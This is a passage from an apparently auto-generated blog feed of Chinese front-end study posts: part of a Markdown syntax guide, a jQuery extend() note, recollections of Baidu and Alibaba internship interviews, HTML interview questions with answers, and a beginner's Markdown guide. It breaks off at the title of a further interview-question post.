注：兼容一般 14.表格 注：: 代表对齐方式 , : 与 | 之间不要有空格，否则对齐会有些不兼容 代码1 1234| a | b | c | |:-------:|:------------- | ----------:| | 居中 | 左对齐 | 右对齐 ||=========|===============|============| 演示 a b c 居中 左对齐 右对齐 ========= =============== ============ 代码2(简约写法)1234a | b | c :-:|:- |-: 居中 | 左对齐 | 右对齐 ============|=================|============= 演示 a b c 居中 左对齐 右对齐 ============ ================= ============= 代码3(特殊表格) 注: 一般对合并单元格，以及其他特殊格式表格，markdown 是无能为力的 所以常规的做法是使用HTML标签，但是这样的编写效率极低。 但是有了这款工具的话，所有问题都迎刃而解. 在线生成HTML代码 Tables Generator (国外的站) 15.支持内嵌的CSS样式 代码1内联样式 演示内联样式 16.语义标记 描述 效果 代码 斜体 斜体 *斜体* 斜体 _斜体_ _斜体_ 加粗 加粗 **加粗** 加粗+斜体 加粗+斜体 ***加粗+斜体*** 加粗+斜体 加粗+斜体 **_加粗+斜体_** 删除线 删除线 ~~删除线~~ 17.语义标签 描述 效果 代码 斜体 斜体 斜体 加粗 加粗 加粗 强调 强调 强调 上标 Za Za 下标 Za Za 键盘文本 Ctrl Ctrl 换行 18.格式化文本 保持输入排版格式不变 代码 12345 hello world hi hello world 演示hello world hi hello world 错误解决方法 注: 标签内部添加空格 或者 直接使用12345678910111213141516**代码1(插入空格)** **演示** < div> < div>< /div> < div>< /div> < div>< /div> < /div>#### 19.公式 {#1} > 注: 1个$左对齐，2个居中 **代码** $$ x \href{why-equal.html}{=} y^2 + 1 $$$ x = {-b \pm \sqrt{b^2-4ac} \over 2a}. $123456789101112**演示**$$ x \href{why-equal.html}{=} y^2 + 1 $$ $ x = {-b \pm \sqrt{b^2-4ac} \over 2a}. $#### 20.分隔符 > 注: 最少三个 --- 或 ***或 * * * **代码** 1234567**演示** ***---* * *#### 21.脚注**代码** Markdown[^1][^1]: Markdown是一种纯文本标记语言 //在文章最后面显示脚注 1234567891011**演示** Markdown[^1] [^1]: Markdown是一种纯文本标记语言#### 22.锚点**代码** > 注: 只有标题支持锚点， 跳转目录方括号后 保持空格#### 23.定义型列表> 注: 解释型定义 Markdown: 轻量级文本标记语言，可以转换成html，pdf等格式 // 开头一个: + Tab 或 四个空格 代码块定义: 代码块定义…… var a = 10; // 保持空一行与 递进缩进123456789101112**演示** Markdown : 轻量级文本标记语言，可以转换成html，pdf等格式 // 开头一个`:` + `Tab` 或 四个空格代码块定义: 代码块定义…… ​ var a = 10; #### 24.自动邮箱链接 **代码** xxx@outlook.com123456**演示** #### 25.流程图**代码** flow // 流程st=>start: 开始|past:> http://www.baidu.com // 开始 e=>end: 结束 // 结束c1=>condition: 条件1:>http://www.baidu.com[_parent]//判断条件 c2=>condition: 条件2 // 判断条件c3=>condition: 条件3 // 判断条件io=>inputoutput: 输出 // 输出//—————-以上为定义参数————————- //—————-以下为连接参数————————-// 开始->判断条件1为no->判断条件2为no->判断条件3为no->输出->结束st->c1(yes,right)->c2(yes,right)->c3(yes,right)->io->e c1(no)->e // 条件1不满足->结束c2(no)->e // 条件2不满足->结束c3(no)->e // 条件3不满足->结束 12#### 26.时序图**代码** sequenceA->>B: 你好Note left of A: 我在左边 // 注释方向，只有左右，没有上下Note right of B: 我在右边B–>A: 很高兴认识你` 27.生成侧边栏扩展代码 注: 生成侧边栏一般是插入JS，再就是模板,总体来说，很是麻烦，效果一般，不作详解。 作者仓库：i5ting_ztree_toc END]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQuery]]></title>
    <url>%2F2018%2F05%2F06%2FJQuery%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[==1. jQuery extend()和jQuery.fn.extend()== 两者调用方式不同： jQuery.extend(),一般由传入的全局函数来调用，主要是用来拓展个全局函数，如$.init()，$.ajax(); jQuery.fn.extend(),一般由具体的实例对象来调用，可以用来拓展个选择器，例如$.fn.each(); 两者的主要功能作用不同： jQuery.extend(object); 为扩展jQuery类本身，为自身添加新的方法。 jQuery.fn.extend(object);给jQuery对象添加方法 大部分插件都是用jQuery.fn.extend()]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>Jquery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端实习总结]]></title>
    <url>%2F2018%2F05%2F06%2F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[百度一面： 内联元素与块级元素的区别，inline-block特性，标签为什么可以定义大小。 对css刻度的理解？em和rem的区别？若line-height为100%是什么情况？若line-height为1.5无单位是什么情况？ call和apply的区别？（记不清问没问） 顺序插入n个标签，然后点击某个弹出它的序号？如何创建元素？如何插入元素？注意闭包的同时如何能对其进行优化？（优化没答上来） 事件流？IE下是事件冒泡还是事件捕捉？addEventListener和attachEvent？ 用原生就是实现文档中对类的获取如同Jquery中的$(.abcd)?本题中回答时判断dom中的类与传入的类名是否相同时用了indexOf，被指出不对，应用正则表达式？可惜正则不会。。。。 如何实现不同页面的通信 localStorage与sessionStorage的异同。 若由a界面调到b界面再从b界面点击确定调到c界面，如何点击浏览器中的后退按钮直接返回到a界面。（不会） 说出几种水平垂直居中的方法。（这个问题一面二面都问了） link和@import的区别 百度二面： 简单介绍下项目，说明项目中遇到的难点是如何解决的。 做项目会切图一般选择什么格式的图。这里gg了，回答是png因为png可以使图片透明？问什么时候选择jpg？哪个是无损压缩哪个是有损压缩。ps：平时我都是看心情的好吗 CSS优先级 说出几种水平垂直居中的方法。（这个问题一面二面都问了） 如何设计一个单页面应用 对路由的理解 H5的新特性？回答了新增了哪些元素，移除了哪些元素。 然后回答了新增了Web存储API，问sessionStorage和 localStorage 的区别？如果baike.baidu.com和www.baidu.com能否共享sessionStorage？能否共享localStorage？baidu.com与www.baidu.com能否共享localStorage？localStorage的存储时间是多久？存储大小？sessionStorage存储大小是多少？cookie存储量？ 继续h5新特性，说了新增canvas API。问canvas绘图与svg绘图有何区别？ 继续h5新特性，说了websocket。问websocket与http的区别？websocket与socket有什么关系？ 继续h5新特性，audio与vedio里一般选择什么格式的音频或视频？ 终于结束H5新特性了？问get和post的区别？ 说了get有可能会传状态码304，post会传200。问状态码301和302的区别，什么情况下会是301什么情况是302。 如果是get请求http如何判断返回的是304，或是200。（Etag） 刚说http时说了请求头，问有没有请求体，请求体里放的是什么？这时脑子一抽回答没有，就问那文件上传怎么上传？ 最后问他问题的时候问了请求体的问题，他回答说是有请求体的，比如在文件上传的时候请求头里会有一个参数，然后请求体里是二进制文件。 浏览器缓存机制 阿里一面：感觉要挂 介绍自己前端情况 git的相关命令，如何解决冲突 对闭包的理解 盒模型 BFC 事件模型 事件代理 在线测评中如何使用事件代理 知道哪些设计模式、设计原则 在项目中遇到冲突，如何解决 前端哪个方向发展 受到批评，心理状态 阿里二面一面竟然没挂，杀入二面，但感觉二面会挂 介绍一下英语比赛项目 介绍下长连接 如何实现长连接 如何实现轮询 setTimeout与setInterval区别 递归调用 setTimeout 与setInterval有何区别 最新的项目用到哪些前端框架 还学过哪些语言，对那种了解较深 设计模式 阅读过jquery源码？介绍源码 压力大的时候心理状态 如何判断一个数字]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>笔试面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html简述]]></title>
    <url>%2F2018%2F05%2F06%2FHTML%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1. HTML的Doctype作用? 严格模式与混杂模式如何区分？它们有何意义? 声明位于文档中的最前面的位置，处于 标签之前。此标签可告知浏览器文档使用哪种 HTML 或 XHTML 规范。所谓的标准模式是指，浏览器按 W3C 标准解析执行代码；怪异模式则是使用浏览器自己的方式解析执行代码，因为不同浏览器解析执行的方式不一样，所以我们称之为怪异模式。浏览器解析时到底使用标准模式还是怪异模式，与你网页中的 DTD 声明直接相关， DTD 声明定义了标准文档的类型（标准模式解析）文档类型，会使浏览器使用相应的方式加载网页并显示，忽略 DTD 声明 , 将使网页进入怪异模式。 2. 简述document.write和 innerHTML的区别。document.write只能重绘整个页面, innerHTML可以重绘页面的一部分。 3. 浏览器页面有哪三层构成，分别是什么，作用是什么？构成：结构层、表示层、行为层分别是：HTML、CSS、JavaScript作用：HTML实现页面结构，CSS完成页面的表现与风格，JavaScript实现一些客户端的功能与业务。 4. HTML5有哪些新特性、移除了哪些元素？Html5新增了 27 个元素，废弃了 16 个元素，根据现有的标准规范，把HTML5的元素按优先级定义为结构性属性、级块性元素、行内语义性元素和交互性元素 4 大类。结构性元素主要负责web上下文结构的定义 section：在 web 页面应用中，该元素也可以用于区域的章节描述。 header：页面主体上的头部， header 元素往往在一对 body 元素中。 footer：页面的底部（页脚），通常会标出网站的相关信息。 nav：专门用于菜单导航、链接导航的元素，是 navigator 的缩写。 article：用于表现一篇文章的主体内容，一般为文字集中显示的区域。 级块性元素主要完成web页面区域的划分，确保内容的有效分割。 aside：用于表达注记、贴士、侧栏、摘要、插入的引用等作为补充主体的内容。 figure：是对多个元素进行组合并展示的元素，通常与 ficaption 联合使用。 code：表示一段代码块。 dialog：用于表达人与人之间的对话，该元素包含 dt 和 dd 这两个组合元素， dt 用于表示说话者，而 dd 用来表示说话内容。 行内语义性元素主要完成web页面具体内容的引用和描述，是丰富内容展示的基础。 meter：表示特定范围内的数值，可用于工资、数量、百分比等。 time：表示时间值。 progress：用来表示进度条，可通过对其 max 、 min 、 step 等属性进行控制，完成对进度的表示和监事。 video：视频元素，用于支持和实现视频文件的直接播放，支持缓冲预载和多种视频媒体格式。 audio：音频元素，用于支持和实现音频文件的直接播放，支持缓冲预载和多种音频媒体格式。 交互性元素主要用于功能性的内容表达，会有一定的内容和数据的关联，是各种事件的基础。 details：用来表示一段具体的内容，但是内容默认可能不显示，通过某种手段（如单击）与 legend 交互才会显示出来。 datagrid：用来控制客户端数据与显示，可以由动态脚本及时更新。 menu：主要用于交互菜单（曾被废弃又被重新启用的元素）。 command：用来处理命令按钮。==5. 你做的网页在哪些流览器测试过,这些浏览器的内核分别是什么?== IE : trident 内核 Firefox ： gecko 内核 Safari : webkit 内核 Opera : 以前是 presto 内核， Opera 现已改用 Google Chrome 的 Blink 内核 Chrome : Blink( 基于 webkit ， Google 与 Opera Software 共同开发 ) 6. 对WEB标准以及W3C的理解与认识?标签闭合、标签小写、不乱嵌套、提高搜索机器人搜索几率、使用外链css和 js 脚本、结构行为表现的分离、文件下载与页面速度更快、内容能被更多的用户所访问、内容能被更广泛的设备所访问、更少的代码和组件，容易维护、改版方便，不需要变动页面内容、提供打印版本而不需要复制内容、提高网站易用性。 7. HTML5行内元素有哪些,块级元素有哪些, 空元素有哪些?(1)行内元素 a - 锚点 abbr - 缩写 acronym - 首字 b - 粗体 ( 不推荐 ) bdo - bidi override big - 大字体 br - 换行 cite - 引用 code - 计算机代码 ( 在引用源码的时候需要 ) dfn - 定义字段 em - 强调 font - 字体设定 ( 不推荐 ) i - 斜体 img - 图片 input - 输入框 kbd - 定义键盘文本 label - 表格标签 q - 短引用 s - 中划线 ( 不推荐 ) samp - 定义范例计算机代码 select - 项目选择 small - 小字体文本 span - 常用内联容器，定义文本内区块 strike - 中划线 strong - 粗体强调 sub - 下标 sup - 上标 textarea - 多行文本输入框 tt - 电传文本 u - 下划线 var - 定义变量 (2)块元素 (block element) address - 地址 blockquote - 块引用 center - 举中对齐块 dir - 目录列表 div - 常用块级容易，也是 css layout 的主要标签 dl - 定义列表 fieldset - form控制组 form - 交互表单 h3 - 大标题 h4 - 副标题 h3 - 3级标题 h4 - 4级标题 h5 - 5级标题 h6 - 6级标题 hr - 水平分隔线 isindex - input prompt menu - 菜单列表 noframes - frames可选内容，（对于不支持 frame 的浏览器显示此区块内容 noscript - ）可选脚本内容（对于不支持 script 的浏览器显示此内容） ol - 排序表单 p - 段落 pre - 格式化文本 table - 表格 ul - 非排序列表可变元素可变元素为根据上下文语境决定该元素为块元素或者内联元素。 applet - java applet button - 按钮 del - 删除文本 iframe - inline frame ins - 插入的文本 map - 图片区块 (map) object - object对象 script - 客户端脚本 (3)空元素 ( 在 HTML[1] 元素中，没有内容的 HTML 元素被称为空元素 ) //换行 //分隔线 //文本框等 //图片 8. 请你描述一下 cookies，sessionStorage 和 localStorage 的区别?sessionStorage 和 localStorage 是 HTML5 Web Storage API 提供的，可以方便的在 web 请求之间保存数据。有了本地数据，就可以避免数据在浏览器和服务器间不必要地来回传递。 sessionStorage、 localStorage 、 cookie 都是在浏览器端存储的数据，其中 sessionStorage 的概念很特别，引入了一个“浏览器窗口”的概念。 sessionStorage 是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后， sessionStorage 即被销毁。同时“独立”打开的不同窗口，即使是同一页面， sessionStorage 对象也是不同的 cookies会发送到服务器端。其余两个不会。 Microsoft 指出 Internet Explorer 8 增加 cookie 限制为每个域名 50 个，但 IE7 似乎也允许每个域名 50 个 cookie 。 Firefox 每个域名 cookie 限制为 50 个。 Opera 每个域名 cookie 限制为 30 个。 Firefox 和 Safari 允许 cookie 多达 4097 个字节，包括名（ name ）、值（ value ）和等号。 Opera 许 cookie 多达 4096 个字节，包括：名（ name ）、值（ value ）和等号。 Internet Explorer 允许 cookie 多达 4095 个字节，包括：名（ name ）、值（ value ）和等号。区别： Cookie 每个域名存储量比较小（各浏览器不同，大致 4K ） 所有域名的存储量有限制（各浏览器不同，大致 4K ） 有个数限制（各浏览器不同） 会随请求发送到服务器 LocalStorage 永久存储 单个域名存储量比较大（推荐 5MB ，各浏览器不同） 总体数量无限制 SessionStorage 只在 Session 内有效 存储量更大（推荐没有限制，但是实际上各浏览器也不同） 9. 说说你对HTML语义化的理解?(1)什么是 HTML 语义化？ 根据内容的结构化（内容语义化），选择合适的标签（代码语义化）便于开发者阅读和写出更优雅的代码的同时让浏览器的爬虫和机器很好地解析。 (2)为什么要语义化？ 为了在没有CSS的情况下，页面也能呈现出很好地内容结构、代码结构 : 为了裸奔时好看；用户体验：例如title、 alt 用于解释名词或解释图片信息、 label 标签的活用；有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。 (3) 语义化标签 SM:用来在页面中表示一套结构完整且独立的内容部分 SM:主题的附属信息 ( 用途很广，主要就是一个附属内容 ) ，如果 article 里面为一篇文章的话，那么文章的作者以及信息内容就是这篇文章的附属内容了 SM:媒体元素，比如一些视频，图片啊等等 SM:选项列表，与 input 元素配合使用，来定义 input 可能的值 SM:用于描述文档或者文档某个部分的细节 ~ 默认属性为 open~ ps:配合 summary 一起使用 10. link和@import的区别?XML/HTML代码12345@import url('CSS文件 '); 两者都是外部引用CSS的方式，但是存在一定的区别： 区别1： link 是 XHTML 标签，除了加载 CSS 外，还可以定义 RSS 等其他事务； @import 属于 CSS 范畴，只能加载 CSS 。 区别2： link 引用 CSS 时，在页面载入时同时加载； @import 需要页面网页完全载入以后加载。 区别3： link 是 XHTML 标签，无兼容问题； @import 是在 CSS2.1 提出的，低版本的浏览器不支持。 区别4： ink 支持使用 Javascript 控制 DOM 去改变样式；而 @import 不支持。 11. 说说超链接target属性的取值和作用？target这个属性指定所链接的页面在浏览器窗口中的打开方式。它的参数值主要有： _blank ：在新浏览器窗口中打开链接文件 _parent ：将链接的文件载入含有该链接框架的父框架集或父窗口中。如果含有该链接的框架不是嵌套的，则在浏览器全屏窗口中载入链接的文件，就象 _self 参数一。 _self ：在同一框架或窗口中打开所链接的文档。此参数为默认值，通常不用指定。但是我不太理解。 _top ：在当前的整个浏览器窗口中打开所链接的文档，因而会删除所有框架。 12. data-属性的作用是什么？data-为前端开发者提供自定义的属性，这些属性集可以通过对象的 dataset 属性获取，不支持该属性的浏览器可以通过 getAttribute 方法获取。 需要注意的是：data-之后的以连字符分割的多个单词组成的属性，获取的时候使用驼峰风格。并不是所有的浏览器都支持 .dataset 属性，测试的浏览器中只有 Chrome 和 Opera 支持。即：当没有合适的属性和元素时，自定义的 data 属性是能够存储页面或 App 的私有的自定义数据。 13. 介绍一下你对浏览器内核的理解？主要分成两部分：渲染引擎(layout engineer或 Rendering Engine) 和 JS 引擎。 渲染引擎：负责取得网页的内容（HTML、 XML 、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。 JS引擎则：解析和执行 javascript 来实现网页的动态效果。最开始渲染引擎和JS引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。 14. iframe有那些缺点？ iframe会阻塞主页面的 Onload 事件； 搜索引擎的检索程序无法解读这种页面，不利于 SEO; iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 使用iframe之前需要考虑这两个缺点。如果需要使用 iframe ，最好是通过 javascript动态给iframe添加 src 属性值，这样可以绕开以上两个问题。 15. 如何实现浏览器内多个标签页之间的通信? WebSocket、 SharedWorker； 也可以调用localstorge、 cookies 等本地存储方式； localstorge另一个浏览上下文里被添加、修改或删除时，它都会触发一个事件， 我们通过监听事件，控制它的值来进行页面信息通信； 注意quirks： Safari 在无痕模式下设置 localstorge 值时会抛出 QuotaExceededError 的异常； 16. HTML5标签的作用?(用途) 使Web页面的内容更加有序和规范 使搜索引擎更加容易按照HTML5规则识别出有效的内容 使Web页面更接近于一种数据字段和表 17. 简述一下src与href的区别？src用于替换当前元素， href 用于在当前文档和引用资源之间确立联系。 src是 source 的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求 src 资源时会将其指向的资源下载并应用到文档内，例如 js 脚本， img 图片和 frame 等元素。1 当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。 href是 Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，如果我们在文档中添加1 那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 link 方式来加载 css ，而不是使用 @import 方式。 18. WebSocket与消息推送？B/S架构的系统多使用HTTP协议，HTTP协议的特点： 1 无状态协议 2 用于通过 Internet 发送请求消息和响应消息 3 使用端口接收和发送消息，默认为80端口 底层通信还是使用Socket完成。HTTP协议决定了服务器与客户端之间的连接方式，无法直接实现消息推送,一些变相的解决办法： 双向通信与消息推送 轮询：客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。 优点：后端程序编写比较容易。 缺点：请求中有大半是无用，浪费带宽和服务器资源。 实例：适于小型应用。 长轮询：客户端向服务器发送Ajax请求，服务器接到请求后 hold 住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。 优点：在无消息的情况下不会频繁的请求，耗费资小。 缺点：服务器hold连接会消耗资源，返回数据顺序无保证，难于管理维护。 Comet 异步的 ashx ， 实例：WebQQ、 Hi 网页版、 Facebook IM 。 长连接：在页面里嵌入一个隐蔵iframe，将这个隐蔵 iframe 的 src 属性设为对一个长连接的请求或是采用xhr请求，服务器端就能源源不断地往客户端输入数据。 优点：消息即时到达，不发无用请求；管理起来也相对便。 缺点：服务器维护一个长连接会增加开销。 实例：Gmail聊天 Flash Socket：在页面中内嵌入一个使用了 Socket 类的 Flash 程序 JavaScript 通过调用此 Flash 程序提供的 Socket 接口与服务器端的 Socket 接口进行通信， JavaScript 在收到服务器端传送的信息后控制页面的显示。 优点：实现真正的即时通信，而不是伪即时。 缺点：客户端必须安装Flash插件；非 HTTP 协议，无法自动穿越防火墙。 实例：网络互动游戏。 Websocket:WebSocket是 HTML5 开始提供的一种浏览器与服务器间进行全双工通讯的网络技术。依靠这种技术可以实现客户端和服务器端的长连接，双向实时通信。特点: 事件驱动 异步 使用 ws 或者 wss 协议的客户端 socket 能够实现真正意义上的推送功能 缺点：少部分浏览器不支持，浏览器支持的程度与方式有区别。 19. 表单提交中Get和Post方式的区别？ get 是从服务器上获取数据， post 是向服务器传送数据。 get 服务器会检测数据有没有更新，若无更新则不会拉取新的数据，返回状态码304,；post请求是不管有没有更新都会再把数据传输一次，成功状态码为200。 get 是把参数数据队列加到提交表单的 ACTION 属性所指的 URL 中，值和表单内各个字段一一对应，在 URL 中可以看到。 post 是通过 HTTP post 机制，将表单内各个字段与其内容放置在 HTML HEADER 内一起传送到 ACTION 属性所指的 URL 地址 , 用户看不到这个过程。 对于 get 方式，服务器端用 Request.QueryString 获取变量的值，对于 post 方式，服务器端用 Request.Form 获取提交的数据。 get 传送的数据量较小，不能大于 2KB 。 post 传送的数据量较大，一般被默认为不受限制。但理论上， IIS4 中最大量为 80KB ， IIS5 中为 100KB 。 get 安全性非常低， post 安全性较高。 20. HTML5 有哪些新增的表单元素？ datalist datetime output keygen date month week time color number range email Url 21. HTML5 废弃了哪些 HTML4 标签？HTML5 废弃了一些过时的，不合理的HTML 标签： frame frameset noframe applet big center basefront 22. HTML5 应用程序缓存和浏览器缓存有什么区别？应用程序缓存是 HTML5 的重要特性之一，提供了离线使用的功能，让应用程序可以获取本地的网站内容，例如 HTML 、 CSS 、图片以及 JavaScript 。这个特性可以提高网站性能，它的实现借助于 manifest 文件，如下：1234….. 与传统浏览器缓存相比，它不强制用户访问的网站内容被缓存。 23. HTML 5 Canvas vs. SVGCanvas 和 SVG 都允许您在浏览器中创建图形，但是它们在根本上是不同的。 SVG SVG 是一种使用 XML 描述 2D 图形的语言。 SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。您可以为某个元素附加 JavaScript 事件处理器。 在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。 Canvas Canvas 通过 JavaScript 来绘制 2D 图形。 Canvas 是逐像素进行渲染的。 在 canvas 中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。 Canvas 与 SVG 的比较 下表列出了 canvas 与 SVG 之间的一些不同之处。 Canvas 依赖分辨率 不支持事件处理器 弱的文本渲染能力 能够以 .png 或 .jpg 格式保存结果图像 最适合图像密集型的游戏，其中的许多对象会被频繁重绘 SVG 不依赖分辨率 支持事件处理器 最适合带有大型渲染区域的应用程序（比如谷歌地图） 复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快） 不适合游戏应用]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown入门_0]]></title>
    <url>%2F2018%2F05%2F06%2FMarkdown%E5%85%A5%E9%97%A8%E4%B9%8B0%2F</url>
    <content type="text"><![CDATA[Markdown——入门指南(补充版)导语： Markdown 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。看到这里请不要被「标记」、「语言」所迷惑，Markdown 的语法十分简单。常用的标记符号也不超过十个，这种相对于更为复杂的 HTML 标记语言来说，Markdown 可谓是十分轻量的，学习成本也不需要太多，且一旦熟悉这种语法规则，会有一劳永逸的效果。 一，认识 Markdown 在刚才的导语里提到，Markdown 是一种用来写作的轻量级「标记语言」，它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages 有大量的排版、字体设置。它使我们专心于码字，用「标记」语法，来代替常见的排版格式。例如此文从内容到格式，甚至插图，键盘就可以通通搞定了。目前来看，支持 Markdown 语法的编辑器有很多，包括很多网站（例如简书）也支持了 Markdown 的文字录入。Markdown 从写作到完成，导出格式随心所欲，你可以导出 HTML 格式的文件用来网站发布，也可以十分方便的导出 PDF 格式，这种格式写出的简历更能得到 HR 的好感。甚至可以利用 CloudApp 这种云服务工具直接上传至网页用来分享你的文章，全球最大的轻博客平台 Tumblr，也支持 Mou 这类 Markdown 工具的直接上传。 Markdown 官方文档这里可以看到官方的 Markdown 语法规则文档，当然，后文我也会用自己的方式阐述这些语法的具体用法。 创始人 John Gruber 的 Markdown 语法说明Markdown 中文版语法说明 使用 Markdown 的优点专注你的文字内容而不是排版样式，安心写作。轻松的导出 HTML、PDF 和本身的 .md 文件。纯文本内容，兼容所有的文本编辑器与字处理软件。随时修改你的文章版本，不必像字处理软件生成若干文件版本导致混乱。可读、直观、学习成本低。 使用 Markdown 的误区We believe that writing is about content, about what you want to say – not about fancy formatting.我们坚信写作写的是内容，所思所想，而不是花样格式。— Ulysses for MacMarkdown 旨在简洁、高效，也由于 Markdown 的易读易写，人们用不同的编程语言实现了多个版本的解析器和生成器，这就导致了目前不同的 Markdown 工具集成了不同的功能（基础功能大致相同），例如流程图与时序图，复杂表格与复杂公式的呈现，虽然功能的丰富并没有什么本质的缺点，但终归有些背离初衷，何况在编写的过程中很费神，不如使用专业的工具撰写来的更有效率，所以如果你需实现复杂功能，专业的图形界面工具会更加方便。当然，如果你对折腾这些不同客户端对 Markdown 的定制所带来高阶功能感到愉悦的话，那也是无可厚非的。 我该用什么工具？Mou for MacMou for Mac在 Mac OS X 上，我强烈建议你用 Mou 这款免费且十分好用的 Markdown 编辑器，它支持实时预览，既左边是你编辑 Markdown 语言，右边会实时的生成预览效果。不仅如此，Mou 还有一些有趣的偏好设置（Preference），例如主题（Themes）与样式（CSS），它们可以配置出定制化的文本编辑效果与导出效果，如果你对自带的主题与样式不满意还可以到 GitHub 上搜索其它爱好者为 Mou 编写的更多主题样式，导入的方式可以在偏好设置的 Themes 或 CSS 选项中 选择 reload。 如果你从事文字工作，我强烈建议你购买 Ulysses for Mac，这款软件入围了苹果 Mac App Store 的 The Best of 2013。它支持更多的写作格式、多文档的支持。Mou，iA writer 这些软件都是基于单文档的管理方式，而 Ulysses 支持 Folder、Filter 的管理，一个 Folder 里面可以创建多个 Sheet，Sheet 之间也可以进行 Combine 处理。 Mac 上一些 Markdown 编辑器Mac 上一些 Markdown 编辑器由于笔者很少接触 Windows，Windows 下的 Markdown 没有过多涉猎，经朋友介绍，有两款还算不错，一款叫做 MarkdownPad ，另一款叫做 MarkPad。 iOS 端很多 app 早已经支持了 Markdown 录入，例如 Drafts，Day One，iA writer 等，另外 Ulysses for iPad 现在已经上架，可以说是 iOS 平台最好的编辑器了。 在 Web端，我强烈推荐简书这款产品，上面有无数热爱文字的人在不停的创造，分享。在 Web 端使用 Markdown 没有比简书更舒服的地方了，同样支持左右两栏的实时预览，字体优雅，简洁。 简书的编辑预览模式简书的编辑预览模式 二，Markdown 语法的简要规则标题是每篇文章都需要也是最常用的格式，在 Markdown 中，如果一段文字被定义为标题，只要在这段文字前加 # 号即可。 一级标题二级标题三级标题以此类推，总共六级标题，建议在井号后加一个空格，这是最标准的 Markdown 语法。补充：除了在前段加上“＃”还可以是在底部加上“＝” 一级标题列表熟悉 HTML 的同学肯定知道有序列表与无序列表的区别，在 Markdown 下，列表的显示只需要在文字前加上 - 或 * 即可变为无序列表，有序列表则直接在文字前加1. 2. 3. 符号要和文字之间加上一个字符的空格。无序列表与有序列表 无序列表： 1 2 3 补充：无序列表出了加上“＊”还可以是“＋”或者“－”无序列表的第二个示例(建议：一个文档中只是用一种无序列表的表示方式） 1 2 3 有序列表： 1 2 3 引用如果你需要引用一小段别处的句子，那么就要用引用的格式。 例如这样只需要在文本前加入 > 这种尖括号（大于号）即可 这里是引用 图片与链接插入链接与插入图片的语法很像，区别在一个 !号 图片为： 链接为：文字 插入图片的地址需要图床，这里推荐围脖图床修复计划 与 CloudApp 的服务，生成URL地址即可。 粗体与斜体Markdown 的粗体和斜体也非常简单，用两个 包含一段文本就是粗体的语法，用一个 包含一段文本就是斜体的语法。 斜体示例：这里是斜体 补充：当然也可以加下划线“_”斜体示例：这里也是斜体 补充：当然从斜体我们也能思考得出加粗的另一种示例加粗示例：这里是加粗加粗示例：这里是加粗 表格表格是我觉得 Markdown 比较累人的地方，例子如下： Tables Are Cool col 3 is right-aligned $1600 col 2 is centered $12 zebra stripes are neat $1 这种语法生成的表格如下： Tables Are Cool col 3 is right-aligned $1600col 2 is centered $12zebra stripes are neat $1 代码框如果你是个程序猿，需要在文章里优雅的引用代码框，在 Markdown下实现也非常简单，只需要用两个 ` 把中间的代码包裹起来。图例： article 使用 tab 键即可缩进。当用到大片的代码的时候需要使用tab加四个空格 示例` row1 cell1 row1 cell2 &nbsp row2 cell2 ` 分割线分割线的语法只需要三个 * 号，例如： 到这里，Markdown 的基本语法在日常的使用中基本就没什么大问题了，只要多加练习，配合好用的工具，写起东西来肯定会行云流水。更多的语法规则，其实 Mou 的 Help 文档栗子很好，当你第一次使用 Mou 时，就会显示该文档。可以用来对用的查找和学习。 引用当我写一段话的时候我先在底部标注一下［1］的链接是什么意思的时候，再次撰写的时候就可以直接在需要链接的部分添加［1］即可：演示如下：这是链接百度 这是谷歌]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试300题]]></title>
    <url>%2F2018%2F05%2F06%2F%E9%9D%A2%E8%AF%95300%E9%A2%98%2F</url>
